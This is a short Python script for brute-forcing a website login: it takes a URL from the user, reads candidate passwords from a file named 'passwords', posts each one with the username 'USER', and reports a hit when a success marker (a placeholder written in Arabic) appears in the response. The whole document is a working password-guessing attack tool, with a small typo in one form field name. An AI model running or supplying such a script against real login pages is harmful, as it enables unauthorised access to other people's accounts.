from requests import post
url=input("Enter Website Url: ")
login_data={"username":'USER' , "passowrd":'' , "login":'SUBMIT'}
with open('passwords' , 'r')as passwd:
    for line in passwd:
        word = line.strip()
        login_data["password"] = word
        req =post(url,data=login_data)
        if "اى كلمه موجوده ف الصفحه بعد ما تفتح".encode() in req.content:
            print(f"[+] The Password is =>> {word} ")
        else:
            print("[!] Password not found")